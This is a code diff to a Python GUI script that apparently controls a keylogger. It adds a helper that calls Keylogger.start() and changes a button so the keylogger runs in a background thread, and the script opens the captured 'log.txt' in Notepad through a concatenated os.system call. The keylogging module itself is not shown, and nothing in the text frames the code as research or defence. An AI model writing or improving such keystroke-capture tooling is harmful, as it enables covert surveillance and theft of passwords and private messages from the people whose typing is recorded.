@@ -1,6 +1,7 @@
 import Keylogger
 import os
 from pathlib import Path
+import threading
 
 
 def notepad(file_name):
@@ -10,6 +11,10 @@ def notepad(file_name):
     file_name: The name of the text file to open.
   """
   os.system("notepad.exe " + file_name)
+
+def run_keylogger():
+    # Call the start function from the Keylogger module
+    Keylogger.start()
 
 if __name__ == "__main__":
   file_name = "log.txt"
@@ -77,7 +82,7 @@ button_1 = Button(
     image=button_image_1,
     borderwidth=0,
     highlightthickness=0,
-    command=lambda:Keylogger.start() ,
+    command=lambda: threading.Thread(target=run_keylogger).start(),
     relief="flat"
 )
 button_1.pack()
